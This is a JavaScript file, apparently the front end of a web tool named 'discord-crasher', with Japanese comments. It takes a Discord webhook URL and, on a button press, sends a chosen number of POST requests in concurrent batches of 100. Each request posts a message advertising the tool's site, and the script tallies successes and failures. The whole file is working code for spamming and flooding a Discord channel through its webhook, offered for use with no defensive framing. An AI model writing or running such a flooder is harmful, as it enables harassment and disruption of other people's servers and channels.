// script.js

document.addEventListener('DOMContentLoaded', () => {
  const webhookInput = document.getElementById('webhookUrl');
  const successCountEl = document.getElementById('successCount');
  const failedCountEl = document.getElementById('failedCount');
  const buttons = document.querySelectorAll('.request-btn');

  let successCount = 0;
  let failedCount = 0;

  // ボタンイベント
  buttons.forEach((button) => {
    button.addEventListener('click', async () => {
      const webhookUrl = webhookInput.value.trim();
      if (!webhookUrl) {
        alert('Webhook URLを入力してください。');
        return;
      }

      const requests = parseInt(button.getAttribute('data-requests'), 10);
      successCount = 0;
      failedCount = 0;
      updateStatus();

      const batchSize = 100;
      const batches = Math.ceil(requests / batchSize);

      for (let batch = 0; batch < batches; batch++) {
        const promises = [];
        for (let i = 0; i < batchSize && batch * batchSize + i < requests; i++) {
          promises.push(sendWebhook(webhookUrl));
        }

        await Promise.allSettled(promises).then((results) => {
          results.forEach((result) => {
            if (result.status === 'fulfilled') {
              successCount++;
            } else {
              failedCount++;
            }
          });
        });
        updateStatus();
      }
    });
  });

  // Webhook送信関数
  async function sendWebhook(webhookUrl) {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: 'https://discord-crasher.vercel.app | Developed by n4n45h1' }),
    });

    if (!response.ok) {
      throw new Error('Webhook送信失敗');
    }
  }

  // ステータス更新
  function updateStatus() {
    successCountEl.textContent = successCount;
    failedCountEl.textContent = failedCount;
  }
});
